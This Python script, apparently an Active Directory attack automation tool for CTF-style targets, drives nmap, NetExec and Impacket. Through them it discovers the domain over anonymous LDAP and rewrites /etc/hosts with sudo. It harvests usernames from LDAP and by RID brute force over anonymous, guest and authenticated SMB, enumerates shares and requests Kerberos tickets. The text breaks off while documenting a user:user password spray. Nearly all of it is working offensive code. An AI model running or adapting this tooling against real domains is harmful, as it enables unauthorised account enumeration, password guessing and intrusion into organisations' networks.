#!/usr/bin/env python3
from termcolor import colored
import subprocess
import argparse
import tempfile
import shutil
import shlex
import time
import os
import sys
import re



# Configuration (Defaults) 
USERNAME_DEFAULT = ""
PASSWORD_DEFAULT = ""
USERS_FILE = "users.txt"

# Centralized Status Printing 
def print_status(message):
    """
    Prints a status message with colored tags.
    
    Supported tags: [+], [-], [!], [!!!], [*], [INFO]
    Only the tags are colored, not the entire message.
    """
    tag_colors = {
        "[+]": colored("[+]", "green"),
        "[-]": colored("[-]", "red"),
        "[!]": colored("[!]", "red"),
        "[!!!]": colored("[!!!]", "red"),
        "[*]": colored("[*]", "blue"),
        "[INFO]": colored("[INFO]", "blue"),
    }

    for tag, colored_tag in tag_colors.items():
        if tag in message:
            message = message.replace(tag, colored_tag)
    print(f"{message}")

def print_header(title):
    """Prints a formatted section header in magenta."""
    print(colored(f"\n\n{title}", "magenta"))


def run_command(cmd_list_or_str, title, is_shell_command=False, capture_output=False, retry_on_empty=False, retry_on_invalid=False, max_retries=2):
    """
    Execute a command with optional intelligent retry logic.
    
    Args:
        cmd_list_or_str: Command as list (e.g., ["nxc", "smb", ip]) or string for shell commands
        title: Description printed before command execution
        is_shell_command: If True, execute as shell command (default: False)
        capture_output: If True, return (output, returncode) tuple (default: False)
        retry_on_empty: Retry if command returns completely empty output (default: False)
        retry_on_invalid: Retry if output is empty, too short, or lacks success indicators (default: False)
                         This is a superset of retry_on_empty - handles all empty cases plus validation
        max_retries: Maximum number of attempts (default: 2)
    
    Returns:
        If capture_output=True: tuple of (output_string, return_code)
        If capture_output=False: tuple of (None, return_code)
    
    Retry Logic (when retry_on_invalid=True):
        - Empty output → Retry
        - Output < 50 chars → Retry (suspiciously short)
        - No success indicators ([+], READ, WRITE, Authenticated, STATUS_SUCCESS, SidTypeUser) → Retry
        - After max_retries attempts, returns whatever output was received
    
    Examples:
        # Simple command, no retry
        run_command(["nmap", "-sV", target], "Port scan")
        
        # SMB command with intelligent retry
        run_command(["nxc", "smb", ip, "--shares"], "Enumerate shares", retry_on_invalid=True)
        
        # Capture output for parsing
        output, rc = run_command(["nxc", "smb", ip], "SMB check", capture_output=True, retry_on_invalid=True)
    """
    print(colored(f"\n{title}", "blue"))

    if isinstance(cmd_list_or_str, list):
        # Create display string with proper quoting for empty strings
        display_parts = []
        for part in cmd_list_or_str:
            if part == "":
                display_parts.append("''")
            elif " " in part:
                display_parts.append(f"'{part}'")
            else:
                display_parts.append(part)
        cmd_str = " ".join(display_parts)
    else:
        cmd_str = cmd_list_or_str

    print(colored(f"$ {cmd_str}", "white"))

    attempt = 0
    full_output = ""
    result = None
    
    # Success indicators for SMB commands (when retry_on_invalid is True)
    success_patterns = [
        r'\[\+\]',           # Success tag
        r'READ',             # Share permissions
        r'WRITE',            # Share permissions
        r'Authenticated',    # Auth success
        r'STATUS_SUCCESS',   # Explicit success
        r'SidTypeUser',      # RID brute results
    ]
    
    while attempt < max_retries:
        if attempt > 0:
            print_status(f"[*] Retry attempt {attempt + 1}/{max_retries} (waiting 2 seconds)...")
            time.sleep(2)  # Wait before retry
        
        result = subprocess.run(
            cmd_list_or_str,
            shell=is_shell_command,
            capture_output=True,
            text=True,
            check=False  # Prevent crash on failure
        )

        full_output = result.stdout + result.stderr

        def colorize_tags(line):
            """Color only tags, not the whole line."""
            tag_colors = {
                r"\[\+\]": colored("[+]", "green"),
                r"\[\-\]": colored("[-]", "red"),
                r"\[\!\]": colored("[!]", "red"),
                r"\[!!!\]": colored("[!!!]", "red"),
                r"\[\*\]": colored("[*]", "blue"),
                r"\[INFO\]": colored("[INFO]", "blue"),
            }
            for pattern, repl in tag_colors.items():
                line = re.sub(pattern, repl, line)
            return line

        # Only print output on first attempt or if it's the last attempt
        if attempt == 0 or attempt == max_retries - 1:
            for line in full_output.splitlines():
                print(colorize_tags(line))

        # Check if we should retry
        should_retry = False
        
        # Check for empty output
        if retry_on_empty and not full_output.strip() and attempt < max_retries - 1:
            should_retry = True
            print_status("[!] Command returned empty output, retrying...")
        
        # Check for invalid/incomplete output (also checks for empty if retry_on_invalid is True)
        if retry_on_invalid and attempt < max_retries - 1:
            # Empty output is also invalid
            if not full_output.strip():
                should_retry = True
                print_status("[!] Command returned empty output, retrying...")
            else:
                has_success_indicator = any(re.search(pattern, full_output, re.IGNORECASE) for pattern in success_patterns)
                
                # Check if output is suspiciously short (less than 50 chars, likely incomplete)
                is_too_short = len(full_output.strip()) < 50
                
                # If no success indicators, the output might be wrong/incomplete
                # OR if the output is suspiciously short
                if not has_success_indicator or is_too_short:
                    should_retry = True
                    if is_too_short:
                        print_status(f"[!] Command output suspiciously short ({len(full_output.strip())} chars), retrying...")
                    else:
                        print_status("[!] Command output appears incomplete (no success indicators), retrying...")
        
        if should_retry:
            attempt += 1
            continue
        
        # Success or final attempt - break the loop
        break
    
    if capture_output:
        return full_output, result.returncode
    else:
        return None, result.returncode


# Check Dependencies 
def check_dependencies():
    """
    Check for required external tools and exit if any are missing.
    
    Required tools:
        - nmap: Network scanning
        - nxc (NetExec): SMB/LDAP enumeration
        - certipy: ADCS enumeration
        - bloodhound-ce-python: BloodHound data collection
        - bloodyAD: Permission checking
        - Impacket scripts: GetNPUsers.py, getTGT.py, GetUserSPNs.py
    
    Exits:
        Exits with code 1 if any dependencies are missing, printing installation instructions
    """
    print_header("\nChecking external dependencies")

    # Map all dependencies to a display name and a unique key for installation
    dependencies = {
        # command_to_check: ("Display Name", "install_key")
        "nmap": ("nmap", "nmap"),
        "nxc": ("NetExec (nxc)", "netexec"),
        "certipy": ("Certipy (ly4k/Certipy)", "certipy"),
        "bloodhound-ce-python": ("BloodHound Python Collector", "bloodhound"),
        "bloodyAD": ("bloodyAD", "bloodyad"),
        "GetNPUsers.py": ("Impacket Script: GetNPUsers.py", "impacket"),
        "getTGT.py": ("Impacket Script: getTGT.py", "impacket"),
        "GetUserSPNs.py": ("Impacket Script: GetUserSPNs.py", "impacket"),
    }

    # Map the unique install_key to the specific command you want to suggest
    install_commands = {
        "nmap": "sudo apt update && sudo apt install nmap -y   # For Debian/Ubuntu based systems",
        "netexec": "pipx install git+https://github.com/Pennyw0rth/NetExec",
        "certipy": "pipx install certipy-ad",
        "bloodhound": "pipx install bloodhound-ce-python",
        "bloodyad": "pipx install bloodyAD",
        "impacket": "pipx install impacket",
    }

    missing_tools = []
    missing_install_keys = set() # Use a set to store unique install keys

    # Loop through all dependencies and check if they exist
    for command, (display_name, install_key) in dependencies.items():
        if not shutil.which(command):
            missing_tools.append(display_name)
            missing_install_keys.add(install_key)

    # If anything is missing, print a detailed report and exit
    if missing_tools:
        print_status("\n[!] Dependencies Missing")
        for tool in sorted(missing_tools):
            print_status(f"[-] Missing: {tool}")

        if missing_install_keys:
            print_status("\n[*] To fix, please run the relevant command(s):")
            # Sort the keys to provide a consistent order
            for key in sorted(list(missing_install_keys)):
                command = install_commands.get(key)
                if command:
                    print(colored(f"    {command}", "yellow"))
        
        print_status("\n[!] Please also ensure all tools are in your system's PATH.\n[!] Review https://github.com/blue-pho3nix/ade for instructions.")
        sys.exit(1)
        
    print_status("[+] All dependencies found.")
    return True


def check_host_nmap(r, suse_pn_fallback=True):
    """
    Check if target host is active using nmap and ping.
    
    Args:
        r: Target IP address
        use_pn_fallback: Currently unused (kept for compatibility)
    
    Returns:
        bool: True if host is up, False otherwise
    
    Method:
        1. Try ICMP echo with nmap (-PE -sn -n)
        2. Fallback to direct ping if nmap doesn't confirm
    """

    print_header(f"Checking if host {r} is active with nmap")

    def run_nmap(args):
        result = subprocess.run(args, capture_output=True, text=True)
        return result.stdout.strip()

    # ICMP echo request with nmap
    command = ["sudo", "nmap", "-PE", "-sn", "-n", r]
    output = run_nmap(command)

    if re.search(r"Host is up.*latency", output, re.IGNORECASE):
        print_status(f"[+] Host {r} is active (nmap confirmed).")
        return True

    # Ping fallback
    ping = subprocess.run(["ping", "-c", "1", "-W", "2", r], capture_output=True, text=True)
    if "1 received" in ping.stdout or "bytes from" in ping.stdout:
        print_status(f"[+] Host {r} is active (confirmed via ping fallback).")
        return True
    
    return False



def ensure_hosts_entry(ip, fqdn, domain):
    """
    Ensure /etc/hosts maps domain and FQDN to the correct IP.
    
    Args:
        ip: Target IP address
        fqdn: Fully qualified domain name (e.g., dc01.corp.local)
        domain: Domain name (e.g., corp.local)
    
    Returns:
        bool: True if modifications were made, False otherwise
    
    Behavior:
        - If domain maps to same IP: no change
        - If domain maps to different IP: remove old entry and add new one
        - If domain not present: add new entry
        - Always displays /etc/hosts content afterward
    """
    hosts_path = "/etc/hosts"
    domain_esc = re.escape(domain)
    

    # Read /etc/hosts (safe to read as non-root)
    try:
        with open(hosts_path, "r", encoding="utf-8") as fh:
            lines = fh.readlines()
    except Exception as e:
        print_status(f"[!] Unable to read {hosts_path}: {e}")
        return False

    # Find any existing mappings
    found_lines = []
    for ln in lines:
        stripped = ln.strip()
        if not stripped or stripped.startswith("#"):
            continue
        parts = stripped.split()
        if len(parts) >= 2:
            if domain.lower() in [p.lower() for p in parts[1:]]:
                found_lines.append((ln, parts[0]))

    modified = False

    # If any existing correct mapping found -> done
    for ln, mapped_ip in found_lines:
        if mapped_ip == ip:
            print_status(f"\n[*] Domain '{domain}' already mapped to {ip} in /etc/hosts (no change).")
            run_command("cat /etc/hosts", "Current /etc/hosts contents", is_shell_command=True)
            return False

    # If found with different IP -> remove them
    if found_lines:
        print_status(f"\n[!] Domain '{domain}' exists with different IP(s). Removing and updating mapping.")
        sed_pattern = rf"/\b{domain_esc}\b/Id"
        try:
            subprocess.run(["sudo", "sed", "-i", sed_pattern, hosts_path], check=False)
            modified = True
        except Exception as e:
            print_status(f"[!] Failed to remove old /etc/hosts entries: {e}")
            run_command("cat /etc/hosts", "Current /etc/hosts contents", is_shell_command=True)
            return False

    # Append new mapping if not already correct
    new_entry = f"{ip} {fqdn} {domain}"
    try:
        cmd = f"echo {shlex.quote(new_entry)} >> {shlex.quote(hosts_path)}"
        subprocess.run(["sudo", "sh", "-c", cmd], check=True)
        print_status(f"[+] Added new /etc/hosts entry: {new_entry}")
        modified = True
    except Exception as e:
        print_status(f"[!] Failed to append new entry: {e}")

    # Always show current /etc/hosts contents
    run_command("cat /etc/hosts", "Current /etc/hosts contents", is_shell_command=True)
    return modified



def domain_discovery(r):
    """
    Performs anonymous LDAP enumeration to discover the domain and FQDN.

    This function runs an anonymous query against the target's LDAP service
    to automatically determine the domain controller's name and the domain it
    belongs to. If successful, it constructs the Fully Qualified Domain Name
    (FQDN) and calls `ensure_hosts_entry` to update the local /etc/hosts file.

    Args:
        r (str): The target IP address of the domain controller.

    Returns:
        tuple: A tuple containing (discovered_domain, discovered_fqdn).
            - discovered_domain (str or None): The discovered domain name
              (e.g., "corp.local"), or None if parsing fails.
            - discovered_fqdn (str or None): The discovered FQDN
              (e.g., "dc01.corp.local"), or None if parsing fails.
    """
    
    domain_art = r"""Domain Discovery
*  **  ** *  *  
 **  *     *  * 
         *  *  *
   *            
         *      
          *     
* *    *        
     *      **  
 *         *    
                
               *
    *   *     * """

    print_header(domain_art)

    discovered_domain = None
    discovered_fqdn = None
    needs_kerberos_rerun = False 

    # Query LDAP anonymously to discover domain info 
    anon_user = ""
    anon_pass = ""
    nxc_list = ["nxc", "ldap", r, "-u", anon_user, "-p", anon_pass]
    nxc_output, _ = run_command(nxc_list, "Get domain name via anonymous LDAP", capture_output=True, retry_on_invalid=True)

    if nxc_output and nxc_output.strip():
        print_status("[*] Received LDAP output (excerpt):")
        for ln in nxc_output.splitlines()[:10]:
            print_status(ln)
            if needs_kerberos_rerun and (not u.strip() or not p.strip()):
                print_status("[-] Kerberos authentication requires valid credentials (-u and -p).")
                print_status("[-] Please rerun with:")
                print(colored("    python script.py -r <box-ip> -u <user> -p <password>", "yellow"))
                sys.exit(1)


        match = re.search(r"\(name:(?P<name>[^)]+)\)\s*\(domain:(?P<domain>[^)]+)\)", nxc_output)
        if match:
            dc_name = match.group("name")
            discovered_domain = match.group("domain")
            discovered_fqdn = f"{dc_name}.{discovered_domain}"
            print_status(f"[+] Parsed FQDN: {discovered_fqdn}")
            ensure_hosts_entry(r, discovered_fqdn, discovered_domain)
        else:
            print_status("[!] Could not parse FQDN/Domain information from LDAP output.")
            
    else:
        print_status("[!] No LDAP response from anonymous query; skipping host mapping.")

    return discovered_domain, discovered_fqdn


def verify_credentials(r, username, password, fqdn, domain, timeout=20):
    """
    Verify credentials via SMB authentication check.
    
    Args:
        r: Target IP address
        username: Username to verify
        password: Password to verify
        fqdn: Not used (kept for compatibility)
        domain: Not used (kept for compatibility)
        timeout: Not used (kept for compatibility)
    
    Returns:
        str: Status of credential verification
            - "no-creds": No username/password provided
            - "ok": Credentials valid
            - "bad": Credentials invalid
            - "kerberos": Kerberos-only environment detected
            - "ambiguous": Unable to determine status
    
    Behavior:
        Runs silent nxc SMB check and interprets output:
        - STATUS_LOGON_FAILURE → "bad"
        - Authenticated/STATUS_SUCCESS → "ok"
        - STATUS_NOT_SUPPORTED/NTLM negotiation failed → "kerberos"
        - Empty or unclear output → "ambiguous"
    """


    if not username or not password:
        return "no-creds"

    print_status("\n[*] Verifying provided credentials before continuing...")

    # Fallback: run nxc smb check (silent)
    try:
        smb_cmd = ["nxc", "smb", r, "-u", username, "-p", password, "--shares"]
        result = subprocess.run(smb_cmd, capture_output=True, text=True, check=False)
        text = (result.stdout + result.stderr).strip()
        
        if "STATUS_NOT_SUPPORTED" in text:
            kerberos_art = r"""888  /                    888                                        
888 /     e88~~8e  888-~\ 888-~88e   e88~~8e  888-~\  e88~-_   d88~\ 
888/\    d888  88b 888    888  888b d888  88b 888    d888   i C888   
888  \   8888__888 888    888  8888 8888__888 888    8888   |  Y88b  
888   \  Y888    , 888    888  888P Y888    , 888    Y888   '   888D 
888    \  "88___/  888    888-_88"   "88___/  888     "88_-~  \_88P  
                                                                     """
            
            detected_art = r"""888~-_               d8                       d8                   888 
888   \   e88~~8e  _d88__  e88~~8e   e88~~\ _d88__  e88~~8e   e88~\888 
888    | d888  88b  888   d888  88b d888     888   d888  88b d888  888 
888    | 8888__888  888   8888__888 8888     888   8888__888 8888  888 
888   /  Y888    ,  888   Y888    , Y888     888   Y888    , Y888  888 
888_-~    "88___/   "88_/  "88___/   "88__/  "88_/  "88___/   "88_/888 
                                                                       """

            print_header(f"{kerberos_art}")
            print_header(f"{detected_art}")
            print_status("\n[!] Kerberos Detected: STATUS_NOT_SUPPORTED in anonymous LDAP check.")
            needs_rerun_from_creds = True
        if not text:
            print_status("[-] No output from nxc smb probe; treating as ambiguous.")
            return "ambiguous"

        # explicit failures
        if re.search(r'STATUS_ACCESS_DENIED|STATUS_LOGON_FAILURE|NT_STATUS_LOGON_FAILURE|authentication failed', text, re.IGNORECASE):
            print_status("[-] Provided credentials failed SMB authentication.")
            return "bad"

        # explicit success markers
        if re.search(r'\[\+\]|Authenticated|STATUS_SUCCESS', text, re.IGNORECASE):
            print_status("[+] Credentials validated (SMB authentication succeeded).")
            return "ok"

        # Kerberos / negotiation hints in SMB output
        if re.search(r'STATUS_NOT_SUPPORTED|KDC_ERR|SPNEGO|NTLM negotiation failed', text, re.IGNORECASE):
            print_status("[+] Kerberos/negotiation detected in SMB output — recommend Kerberos flows.")
            return "kerberos"

        
        # ambiguous but non-empty output - show why
        print_status("[!] Credential verification returned ambiguous result.")
        print_status("[!] Reason: Output contained no clear success or failure indicators")
        print_status("[!] Output excerpt (first 200 chars):")
        print_status(f"    {text[:200]}")
        return "ambiguous"


    except Exception as e:
        print_status(f"[!] Exception during SMB credential probe: {e}")
        return "ambiguous"


def update_users_file(new_unique, USERS_FILE, print_status_func):
    """
    Reads the existing users file, removes case-insensitive duplicates,
    merges in new_unique usernames (preserving first-seen case), and
    finally appends a lowercase version for every unique username.

    Args:
        new_unique (list): A list of case-preserved, unique usernames discovered from LDAP.
        USERS_FILE (str): The path to the file to be updated.
        print_status_func (function): The function used for logging status messages.
    """
    
    # Read existing users file and dedupe it preserving first-seen case/order
    existing_usernames = []
    seen_existing = set()
    file_exists = os.path.exists(USERS_FILE)
    file_had_dupes = False

    if file_exists:
        try:
            with open(USERS_FILE, "r", encoding="utf-8") as ef:
                for line in ef:
                    ln = line.strip()
                    if not ln:
                        continue
                    lnl = ln.lower()
                    if lnl in seen_existing:
                        file_had_dupes = True
                        continue
                    seen_existing.add(lnl)
                    existing_usernames.append(ln)
        except Exception as e:
            print_status_func(f"[-] Warning: failed to read existing {USERS_FILE}: {e}")
            existing_usernames = []
            seen_existing = set()
            file_exists = False # Treat as non-existent on read failure

    # If the existing file had duplicates, rewrite it deduped first
    if file_had_dupes:
        try:
            with open(USERS_FILE, "w", encoding="utf-8") as ef:
                for name in existing_usernames:
                    ef.write(name + "\n")
            print_status_func(f"[+] Removed duplicates from existing {USERS_FILE} (rewrote file).")
        except Exception as e:
            print_status_func(f"[-] Warning: failed to rewrite {USERS_FILE} to remove duplicates: {e}")

    # Determine which new names to add (case-insensitive)
    to_add_originals = []
    for name in new_unique:
        if name.lower() not in seen_existing:
            to_add_originals.append(name)
            seen_existing.add(name.lower())  # mark as present so later names don't duplicate

    # Append only missing originals (if any)
    if to_add_originals:
        mode = "w" if not file_exists else "a"
        action = "Created" if not file_exists else "Appended"
        
        try:
            with open(USERS_FILE, mode, encoding="utf-8") as ef:
                for name in to_add_originals:
                    ef.write(name + "\n")
            
            print_status_func(f"[+] {action} new username(s) to {USERS_FILE}.")
        except Exception as e:
            print_status_func(f"[-] Error {action.lower()} to {USERS_FILE}: {e}")
    else:
        if not file_exists:
            print_status_func(f"[*] No new usernames to write; {USERS_FILE} not created.")
        else:
            print_status_func(f"[*] {USERS_FILE} already up-to-date. No originals added.")


    # Ensure every username has a lowercase entry (append missing lowercase lines only)
    try:
        # Re-read the file content after all original additions
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, "r", encoding="utf-8") as ef:
                lines = [ln.strip() for ln in ef if ln.strip()]
        else:
            # If we still don't have a file, there's nothing to lowercase
            return 

        exact_lines = set(lines)  # exact strings currently present
        
        # Dedupe case-insensitively while preserving order for finding unique names
        seen_lower = set()
        unique_by_lower = []
        for ln in lines:
            lnl = ln.lower()
            if lnl in seen_lower:
                continue
            seen_lower.add(lnl)
            unique_by_lower.append(ln)

        # Find lowercase forms missing as exact lines
        to_append = []
        for name in unique_by_lower:
            lower_name = name.lower()
            if lower_name not in exact_lines:
                to_append.append(lower_name)
                exact_lines.add(lower_name)  # mark as present for this run

        if to_append:
            with open(USERS_FILE, "a", encoding="utf-8") as ef:
                for ln in to_append:
                    ef.write(ln + "\n")
            print_status_func(f"[+] Appended lowercase name(s) to {USERS_FILE}.")
        else:
            print_status_func(f"[*] Lowercase entries already present in {USERS_FILE}. No changes made.")
            
    except Exception as e:
        print_status_func(f"[-] Error ensuring lowercase entries in {USERS_FILE}: {e}")


def ldap_enumeration(r, u, p, k):
    """
    Perform LDAP enumeration to discover domain information and usernames.
    
    Args:
        r: Target IP address
        u: Username (empty string for anonymous)
        p: Password (empty string for anonymous)
        k: Boolean indicating if Kerberos authentication should be used
    
    Returns:
        tuple: (discovered_domain, discovered_fqdn, needs_kerberos_rerun)
            - discovered_domain: Domain name (e.g., "CORP.LOCAL") or None
            - discovered_fqdn: Full DC name (e.g., "DC01.CORP.LOCAL") or None
            - needs_kerberos_rerun: True if Kerberos-only environment detected
    
    Actions:
        1. Anonymous LDAP query to discover domain/FQDN
        2. Extract user descriptions from LDAP
        3. Extract usernames and update users.txt file
    """
    ldap_art = r"""LDAP Enumeration
 **  *   * * *  
*  *  * * *   **
       *    *   
  *        *    
                
*           *   
 *     **       
     **  *     *
              * 
   *            
                
          *  *  """

    print_header(ldap_art)

    # Enumerate user descriptions and collect usernames
    awk_script = r"""/description/{desc=substr($0,index($0,$6));valid=(desc!~/Built-in account for guest access to the computer\/domain/)} /sAMAccountName/&&valid{ if(!seen[$6]++){ printf "[+]Description: %-30s User: %s\n", desc, $6 } valid=0 }"""

    # Prepare shell-quoted creds for pipeline commands
    ldap_user_shell = shlex.quote(u) if u else "''"
    ldap_pass_shell = shlex.quote(p) if p else "''"
    auth_type = "Authenticated" if u and p else "Anonymous"

    # Dynamically add the Kerberos flag only if 'k' is True
    kerberos_opts = ["-k"] if k else []
    

    # Build the base command as a list first
    base_nxc_cmd_list = ["nxc", "ldap", r, "-u", ldap_user_shell, "-p", ldap_pass_shell] + kerberos_opts

    # Then join it into a string for the shell pipeline
    base_nxc_cmd_str = ' '.join(base_nxc_cmd_list)

    # Now build the final commands using the dynamic base string
    ldap_desc_cmd = f"{base_nxc_cmd_str} --query '(objectclass=user)' '' | awk '{awk_script}'"
    cmd_check_users = f"{base_nxc_cmd_str} --query '(objectclass=user)' '' | grep sAMAccountName | awk '{{print $6}}'"

   
    print_status("[*] Running LDAP description extraction.")
    output_desc, _ = run_command(ldap_desc_cmd, f"Check for linked description/sAMAccountName ({auth_type})", is_shell_command=True, capture_output=True)

    if not output_desc or not output_desc.strip():
        print_status("\n[*] No descriptions found in LDAP results.")

    print_status("\n[*] Running LDAP username extraction.")
    output_users, _ = run_command(cmd_check_users, f"Check for sAMAccountName ({auth_type})", is_shell_command=True, capture_output=True)

    if output_users and output_users.strip():
        raw_names = [n.strip() for n in output_users.splitlines() if n.strip()]
        seen_new = set()
        new_unique = []
        for n in raw_names:
            nl = n.lower()
            if nl in seen_new:
                continue
            seen_new.add(nl)
            new_unique.append(n)

        print_status(f"[+] Found unique usernames from LDAP.")
        update_users_file(new_unique, USERS_FILE, print_status)
    else:
        print_status("[*] No usernames discovered via LDAP username extraction.")


def create_users_from_nxc(
    r,
    USERS_FILE="users.txt",
    debug_log="nxc_rid_debug.log",
    username=None,
    password=None,
    kerberos=False,
    fqdn=None,
):
    """
    Perform RID brute-force to enumerate usernames and update users.txt.
    
    Args:
        r: Target IP address
        USERS_FILE: Path to output file for discovered usernames
        debug_log: Path to save raw nxc output for debugging
        username: Username for authenticated enumeration (None for anonymous)
        password: Password for authenticated enumeration (None for anonymous)
        kerberos: If True, use Kerberos authentication
        fqdn: Fully qualified domain name (required for Kerberos)
    
    Returns:
        bool: True if usernames were discovered and added, False otherwise
    
    Authentication priority:
        1. Kerberos (if kerberos=True and fqdn provided)
        2. Authenticated (if username/password provided)
        3. Anonymous, with Guest fallback
    
    Notes:
        - Brutes RIDs up to 5000
        - Case-preserving username deduplication
        - Updates users.txt via update_users_file()
    """
    abs_users = os.path.abspath(USERS_FILE)

    def parse_users(output):
        """Return a case-preserved, deduped list of usernames parsed from output."""
        candidates = []
        for line in (output or "").splitlines():
            if "SidTypeUser" not in line:
                continue
            # primary pattern: backslash then username then space + (SidTypeUser)
            m = re.search(r'\\([^\s\\(]+)\s*\(SidTypeUser\)', line)
            if m:
                candidates.append(m.group(1))
                continue
            # fallback: any token after last backslash
            if "\\" in line:
                part = line.rsplit("\\", 1)[-1].strip()
                if part:
                    candidates.append(part.split(None, 1)[0])
                    continue
            # final fallback: id: domain\user
            m2 = re.search(r'^\s*\d+:\s*[^\\\s]*\\([^\s(]+)', line)
            if m2:
                candidates.append(m2.group(1))

        # dedupe case-insensitively while preserving first-seen case
        seen_lower = set()
        unique_users = []
        for u in candidates:
            ul = u.lower()
            if ul in seen_lower:
                continue
            seen_lower.add(ul)
            unique_users.append(u)
        return unique_users

    # Helper to normalize run_command return to a string
    def normalize_result(result):
        if result is None:
            return ""
        if isinstance(result, tuple):
            return result[0] or ""
        if isinstance(result, str):
            return result
        if hasattr(result, "stdout"):
            return (result.stdout or "") + (getattr(result, "stderr", "") or "")
        try:
            return str(result)
        except Exception:
            return ""

    users = []

    # Kerberos mode
    if kerberos and fqdn:
        cmd = ["nxc", "smb", fqdn, "--rid-brute", "5000", "-k"]
        if username and password:
            cmd += ["-u", username, "-p", password]
        label = "RID Brute-Force (Kerberos)"
        print_status(f"[+] {label}")
        result = run_command(cmd, label, capture_output=True, retry_on_invalid=True)
        output = normalize_result(result)
        users = parse_users(output)

    # Authenticated mode
    elif username and password:
        cmd = ["nxc", "smb", r, "-u", username, "-p", password, "--rid-brute", "5000"]
        label = f"RID Brute-Force (Authenticated as {username})"
        print_status(f"[+] {label}")
        result = run_command(cmd, label, capture_output=True, retry_on_invalid=True)
        output = normalize_result(result)
        users = parse_users(output)

    # Anonymous/Guest mode
    else:
        # Try anonymous first
        print_status(f"\n[+] No credentials provided — attempting Anonymous RID brute")
        result = run_command(
            ["nxc", "smb", r, "-u", "anonymous", "-p", "", "--rid-brute", "5000"],
            "RID Brute-Force (Anonymous)",
            capture_output=True,
            retry_on_invalid=True
        )
        output = normalize_result(result)
        users = parse_users(output)

        # If anonymous found none, try guest fallback
        if not users:
            print_status(f"[!] Anonymous yielded no users — trying Guest fallback")
            result = run_command(
                ["nxc", "smb", r, "-u", "guest", "-p", "", "--rid-brute", "5000"],
                "RID Brute-Force (Guest)",
                capture_output=True,
                retry_on_invalid=True
            )
            output = normalize_result(result)
            users = parse_users(output)

    # Save raw output for debugging (last run's output)
    try:
        with open(debug_log, "w", encoding="utf-8") as dbg:
            dbg.write(output or "")
    except Exception:
        pass

    if not users:
        print_status("[!] No usernames parsed from nxc output.")
        print_status(f"[*] See {debug_log} for raw nxc output and adjust parser if needed.")
        return False

    # Merge/update existing users 
    update_users_file(users, USERS_FILE, print_status)

    return True


def smb_enum(r, f, d, u, p, k):
    smb_art = r"""SMB Enumeration
  * *   * * *  
 *   * * *   **
*     *    *   
          *    
* *            
           *   
 *    **       
    **  *     *
             * 
               
               
         *  *  """
    print_header(smb_art)
    
    # Authenticated Path (u and p are set) 
    if u and p:
        print_status("\n[*] Running Authenticated checks...")
        
        if k and d:
            auth_opts = ["-u", u, "-p", p] 
        elif u and p:
            # Standard NTLM authentication (initial run or when k is False).
            auth_opts = ["-u", u, "-p", p]
        else:
            auth_opts = []
        
        # Kerberos Ticket/Connection Logic (for the second run)
        if k and f and d:
            ccache_file = f"{u}.ccache"

            # Get Kerberos TGT FIRST (This tool requires the password, but FQDN positional argument is REMOVED)
            run_command(["getTGT.py", f"{d}/{u}:{p}", "-k", "-dc-ip", r], "Get Kerberos TGT with getTGT.py")

            # Wait briefly and verify the cache file exists before proceeding
            max_wait = 5  # seconds
            wait_interval = 0.5
            elapsed = 0
            while not os.path.exists(ccache_file) and elapsed < max_wait:
                time.sleep(wait_interval)
                elapsed += wait_interval
            
            if os.path.exists(ccache_file):
                os.environ["KRB5CCNAME"] = ccache_file
                print_status(f"[+] Found TGT cache {ccache_file} and exported KRB5CCNAME.")
                
                # Small additional delay to ensure file is fully written
                time.sleep(0.5)
                
                # NOW run NXC Kerberos Share Enumeration (using FQDN) with the ticket ready - with intelligent retry
                run_command(["nxc", "smb", f, "-u", u, "-p", p, "-k", "--shares"], 
                           "Enumerate SMB shares (Kerberos with nxc)", retry_on_invalid=True)
                
                cmd_str = f"KRB5CCNAME={ccache_file} smbclient.py -k {f}"
                print(colored(f"\nConnect to SMB using Kerberos ticket", 'blue'))
                print(colored(f"\n{'='*60}", 'yellow'))
                print(colored(f"  MANUAL SMB CONNECTION COMMAND", 'yellow'))
                print(colored(f"  {cmd_str}", 'yellow'))
                print(colored(f"{'='*60}", 'yellow'))                
                print_status("[*] Kerberos ticket is now active for this script's remaining commands.")
                print_status("[*] To use manually in your shell, run the command shown above.")
            else:
                print_status(f"[-] ERROR: Kerberos ticket file '{ccache_file}' not found after getTGT.py (waited {max_wait}s).")
            
            # Always try to refresh/merge usernames from RID brute (merge only adds new users)
            print_status(f"\n[*] Ensuring {USERS_FILE} is up-to-date via nxc RID-brute (may merge new names).")
            create_users_from_nxc(r, username=u, password=p, kerberos=True, fqdn=f)
        else:
            # NTLM/Kerberos Authenticated Checks (Uses IP address)
            run_command(["nxc", "smb", r] + auth_opts + ["--shares"], 
                       "Enumerate SMB shares (Authenticated)", retry_on_invalid=True)
            create_users_from_nxc(r, username=u, password=p)

    # Anonymous/Guest Path (ONLY runs if NO credentials were provided) 
    else:
        print_status("\n[*] Running initial Anonymous/Guest checks...")

        # Anonymous Shares (no extra quotes) - with intelligent retry
        run_command(["nxc", "smb", r, "-u", "anonymous", "-p", "", "--shares"],
                    "Enumerate SMB shares (Anonymous) ", retry_on_invalid=True)
        
        # Add delay between commands to avoid connection issues
        time.sleep(1)

        # Guest Shares - with intelligent retry
        run_command(["nxc", "smb", r, "-u", "guest", "-p", "", "--shares"],
                    "Enumerate SMB shares (Guest) ", retry_on_invalid=True)
        
        # Add delay before RID brute-force
        time.sleep(1)

        # RID Brute-Force to create user list 
        create_users_from_nxc(r)


# patterns to find anywhere in an output line
_MATCH_PATTERNS = [
    re.compile(r'\[\+\]'),                       # success token anywhere
    re.compile(r'\[\-\]'),                       # failure token anywhere
    re.compile(r'\[\!\]'),
    re.compile(r'STATUS_[A-Z_]+', re.IGNORECASE),# STATUS_ codes
    re.compile(r'Authenticated', re.IGNORECASE), # auth success word
    re.compile(r'Connection Error', re.IGNORECASE), # connection errors
]

def _line_matches(line: str) -> bool:
    for pat in _MATCH_PATTERNS:
        if pat.search(line):
            return True
    return False

def try_user_user_file(file_path, target, note="Try user:user", timeout=30):
    """
    Perform user:user password spray attack using usernames from a file.
    
    Args:
        file_path: Path to file containing usernames (one per line)
        target: Target IP address
        note: Description of the spray attempt (for logging)
        timeout: Timeout in seconds for each authentication attempt
    
    Behavior:
        - Reads usernames from file_path
        - Attempts authentication with username:username for each user
        - Prints only lines matching success/failure patterns
        - Silently skips empty lines
    
    Output patterns matched:
        [+], [-], [!], STATUS_*, Authenticated, Connection Error
    
    Example output:
        [*] Starting Try user:user (Checking users.txt)...
        $ nxc smb 10.10.10.161 -u <user> -p <user> --continue-on-success
